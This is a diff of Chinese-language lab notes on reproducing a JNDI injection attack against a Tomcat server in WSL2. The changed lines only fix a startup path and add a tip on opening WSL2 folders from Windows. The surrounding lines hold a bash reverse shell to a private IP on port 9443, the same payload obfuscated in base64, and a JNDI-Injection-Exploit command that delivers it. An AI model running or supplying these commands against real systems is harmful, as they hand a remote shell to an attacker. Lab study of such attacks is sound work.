@@ -23,7 +23,9 @@ bash -i >& /dev/tcp/192.168.211.129/9443 0>&1
 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMS4xMjkvOTQ0MyAwPiYx}|{base64,-d}|{bash,-i}
 ```
 
-最后的ip是apache服务器的，172.26.39.196启动apache命令`/usr/local/apache-tomcat-8.5.69/webapps/ROOT# ./startup.sh `
+最后的ip是apache服务器的，172.26.39.196的wls2启动apache命令`/usr/local/apache-tomcat-8.5.69/bin# ./startup.sh `
+
+Windows访问WSL2子系统的文件夹，在文件资源管理器输入`\\wsl$`
 
 ```
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMS4xMjkvOTQ0MyAwPiYx}|{base64,-d}|{bash,-i}" -A "172.26.39.196"
